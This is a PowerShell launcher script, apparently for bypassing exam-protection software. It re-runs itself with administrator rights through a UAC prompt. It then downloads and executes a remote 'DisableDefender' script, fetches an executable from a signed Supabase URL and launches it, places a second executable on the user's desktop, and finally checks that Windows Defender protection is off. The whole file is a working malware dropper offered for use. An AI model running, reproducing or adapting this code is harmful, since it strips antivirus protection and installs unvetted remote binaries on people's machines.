# ================================================================
# FULL OUTPUT LAUNCHER + DESKTOP DROP
# ================================================================

# ---- SET THIS TO YOUR RAW GITHUB URL ----
$myUrl = "https://raw.githubusercontent.com/examprotectorbypass/jjs/refs/heads/main/luncher.ps1"

Write-Host ""
Write-Host "================================================================" -ForegroundColor DarkCyan
Write-Host " LAUNCHER START"
Write-Host "================================================================" -ForegroundColor DarkCyan
Write-Host "Time       : $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
Write-Host "User       : $env:USERNAME"
Write-Host "Computer   : $env:COMPUTERNAME"
Write-Host "PWD        : $PWD"
Write-Host "PSVersion  : $($PSVersionTable.PSVersion)"
Write-Host "ProcessID  : $PID"

$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
Write-Host "IsAdmin    : $isAdmin"

if (-not $isAdmin) {
    Write-Host ""
    Write-Host "================================================================" -ForegroundColor DarkCyan
    Write-Host " NOT ADMIN - relaunching elevated - UAC prompt should appear"
    Write-Host "================================================================" -ForegroundColor DarkCyan

    # 'irm | iex' has no script path, so re-download ourselves to a temp file
    $tmpScript = Join-Path $env:TEMP ("launcher_" + [guid]::NewGuid().ToString() + ".ps1")
    Write-Host "Fetching script to: $tmpScript"
    try {
        Invoke-RestMethod -Uri $myUrl -OutFile $tmpScript -ErrorAction Stop
        Write-Host "Saved OK. Size: $((Get-Item $tmpScript).Length) bytes" -ForegroundColor Green
    } catch {
        Write-Host "Failed to fetch script for elevation: $_" -ForegroundColor Red
        Read-Host "Press Enter to close"
        return
    }

    Write-Host "Relaunching elevated..."
    $child = Start-Process powershell.exe -Verb RunAs -Wait -PassThru -ArgumentList @(
        "-NoProfile","-ExecutionPolicy","Bypass","-File",$tmpScript
    )
    Write-Host "Elevated child exited. ExitCode: $($child.ExitCode)"
    Remove-Item $tmpScript -Force -ErrorAction SilentlyContinue
    Read-Host "Press Enter to close"
    return
}

$ErrorActionPreference = 'Continue'

# ---- Step 1: Defender ----
Write-Host ""
Write-Host "================================================================" -ForegroundColor DarkCyan
Write-Host " STEP 1/4 : DEFENDER DISABLER"
Write-Host "================================================================" -ForegroundColor DarkCyan

$defenderUrl = "https://raw.githubusercontent.com/examprotectorbypass/jjs/refs/heads/main/DisableDefender.ps1"
Write-Host "Fetching: $defenderUrl"
try {
    $defenderScript = Invoke-RestMethod -Uri $defenderUrl -ErrorAction Stop
    Write-Host "Downloaded OK. Length: $($defenderScript.Length) chars" -ForegroundColor Green
    Write-Host ""
    Write-Host "--- Defender script output START ---" -ForegroundColor Yellow
    Invoke-Expression $defenderScript
    Write-Host "--- Defender script output END ---" -ForegroundColor Yellow
    Write-Host "Defender step: SUCCESS" -ForegroundColor Green
} catch {
    Write-Host "Defender step FAILED: $_" -ForegroundColor Red
}

# ---- Step 2: Download xleetets.exe ----
Write-Host ""
Write-Host "================================================================" -ForegroundColor DarkCyan
Write-Host " STEP 2/4 : DOWNLOAD xleetets.exe"
Write-Host "================================================================" -ForegroundColor DarkCyan

$url = 'https://uddxinkwpjvqdxnaqelw.supabase.co/storage/v1/object/sign/myfiles/etsD.exe?token=eyJraWQiOiIzYmU3ZTlhOS1hNTk5LTQ3NWMtOWU5OS0yZTRhODI5MDIzNTQiLCJhbGciOiJIUzI1NiJ9.eyJ1cmwiOiJteWZpbGVzL2V0c0QuZXhlIiwic2NvcGUiOiJkb3dubG9hZCIsImlhdCI6MTc4OTU2ODA4MywiZXhwIjoyMTA0OTI4MDgzfQ.NGY7nc_Ynb2XLYwLGFwGVIEbIBrYrTIPEVZq38DjPnk'
$out = Join-Path $env:TEMP 'xleetets.exe'

Write-Host "URL     : $url"
Write-Host "Output  : $out"

if (Test-Path $out) {
    Write-Host "Removing existing file..." -ForegroundColor Yellow
    Remove-Item $out -Force -ErrorAction SilentlyContinue
}

Write-Host ""
Write-Host "--- curl output START ---" -ForegroundColor Yellow
curl.exe -L --fail --progress-bar -o $out $url
$curlExit = $LASTEXITCODE
Write-Host "--- curl output END ---" -ForegroundColor Yellow
Write-Host ""
Write-Host "curl ExitCode : $curlExit"

if (Test-Path $out) {
    $fi = Get-Item $out
    Write-Host "File exists   : YES" -ForegroundColor Green
    Write-Host "File size     : $($fi.Length) bytes" -ForegroundColor Green
    Write-Host "Last write    : $($fi.LastWriteTime)"
    Write-Host "Full path     : $($fi.FullName)"
} else {
    Write-Host "File exists   : NO - download failed" -ForegroundColor Red
    Read-Host "Press Enter to close"
    return
}

# ---- Step 3: Launch xleetets.exe ----
Write-Host ""
Write-Host "================================================================" -ForegroundColor DarkCyan
Write-Host " STEP 3/4 : LAUNCH xleetets.exe"
Write-Host "================================================================" -ForegroundColor DarkCyan

try {
    $proc = Start-Process -FilePath $out -WorkingDirectory $env:TEMP -PassThru -ErrorAction Stop
    Write-Host "Process started. PID: $($proc.Id)" -ForegroundColor Green

    Start-Sleep -Seconds 5

    $still = Get-Process -Id $proc.Id -ErrorAction SilentlyContinue
    if ($still) {
        Write-Host "Process is RUNNING - PID $($proc.Id)" -ForegroundColor Green
        Write-Host "Name        : $($still.ProcessName)"
        Write-Host "Memory      : $([math]::Round($still.WorkingSet64 / 1MB, 2)) MB"
        Write-Host "CPU         : $([math]::Round($still.CPU, 2)) s"
        Write-Host "MainWindow  : $($still.MainWindowTitle)"
    } else {
        Write-Host "Process EXITED within 5s" -ForegroundColor Red
        Write-Host "ExitCode    : $($proc.ExitCode)"
    }
} catch {
    Write-Host "Launch FAILED: $_" -ForegroundColor Red
    Write-Host "Exception type: $($_.Exception.GetType().FullName)"
}

# ---- Step 4: Download Dwluncher.exe to Desktop (no launch) ----
Write-Host ""
Write-Host "================================================================" -ForegroundColor DarkCyan
Write-Host " STEP 4/4 : DOWNLOAD Dwluncher.exe TO DESKTOP - no launch"
Write-Host "================================================================" -ForegroundColor DarkCyan

$dwUrl = 'https://uddxinkwpjvqdxnaqelw.supabase.co/storage/v1/object/sign/myfiles/Dwluncher.exe?token=eyJraWQiOiIzYmU3ZTlhOS1hNTk5LTQ3NWMtOWU5OS0yZTRhODI5MDIzNTQiLCJhbGciOiJIUzI1NiJ9.eyJ1cmwiOiJteWZpbGVzL0R3bHVuY2hlci5leGUiLCJzY29wZSI6ImRvd25sb2FkIiwiaWF0IjoxNzg5NjM2NzMwLCJleHAiOjI0MjAzNTY3MzB9.Ky8yFMWdmlANKKjKDk8EV2F82h__tlV7o5p2gwxRzzI'

# Resolve the actual user's Desktop even when running as admin
$desktop = [Environment]::GetFolderPath('Desktop')
if (-not $desktop -or -not (Test-Path $desktop)) {
    $desktop = Join-Path $env:USERPROFILE 'Desktop'
}

# When elevated, $env:USERPROFILE points to the admin's profile, not the real user's.
# Use the original interactive user's desktop via the explorer process owner if possible.
try {
    $explorer = Get-CimInstance Win32_Process -Filter "Name='explorer.exe'" -ErrorAction SilentlyContinue | Select-Object -First 1
    if ($explorer) {
        $owner = Invoke-CimMethod -InputObject $explorer -MethodName GetOwner -ErrorAction SilentlyContinue
        if ($owner -and $owner.User) {
            $realProfile = "C:\Users\$($owner.User)"
            $realDesktop = Join-Path $realProfile 'Desktop'
            if (Test-Path $realDesktop) {
                $desktop = $realDesktop
                Write-Host "Detected real user desktop: $desktop" -ForegroundColor Gray
            }
        }
    }
} catch {
    Write-Host "Could not detect interactive user desktop, using default: $desktop" -ForegroundColor Yellow
}

$dwOut = Join-Path $desktop 'Dwluncher.exe'

Write-Host "URL     : $dwUrl"
Write-Host "Output  : $dwOut"

if (Test-Path $dwOut) {
    Write-Host "Removing existing file..." -ForegroundColor Yellow
    Remove-Item $dwOut -Force -ErrorAction SilentlyContinue
}

Write-Host ""
Write-Host "--- curl output START ---" -ForegroundColor Yellow
curl.exe -L --fail --progress-bar -o $dwOut $dwUrl
$dwExit = $LASTEXITCODE
Write-Host "--- curl output END ---" -ForegroundColor Yellow
Write-Host ""
Write-Host "curl ExitCode : $dwExit"

if (Test-Path $dwOut) {
    $dfi = Get-Item $dwOut
    Write-Host "File exists   : YES" -ForegroundColor Green
    Write-Host "File size     : $($dfi.Length) bytes" -ForegroundColor Green
    Write-Host "Last write    : $($dfi.LastWriteTime)"
    Write-Host "Full path     : $($dfi.FullName)"
    Write-Host "Saved to Desktop - NOT launched." -ForegroundColor Green
} else {
    Write-Host "File exists   : NO - download failed" -ForegroundColor Red
}

# ---- Defender status ----
Write-Host ""
Write-Host "================================================================" -ForegroundColor DarkCyan
Write-Host " DEFENDER STATUS"
Write-Host "================================================================" -ForegroundColor DarkCyan

try {
    $mp = Get-MpComputerStatus -ErrorAction Stop
    Write-Host "RealTimeProtectionEnabled : $($mp.RealTimeProtectionEnabled)"
    Write-Host "AntivirusEnabled          : $($mp.AntivirusEnabled)"
    Write-Host "BehaviorMonitorEnabled    : $($mp.BehaviorMonitorEnabled)"
    Write-Host "IoavProtectionEnabled     : $($mp.IoavProtectionEnabled)"
} catch {
    Write-Host "Could not query Defender: $_" -ForegroundColor Yellow
}

Write-Host ""
Write-Host "================================================================" -ForegroundColor DarkCyan
Write-Host " LAUNCHER DONE"
Write-Host "================================================================" -ForegroundColor DarkCyan

Read-Host "Press Enter to close"
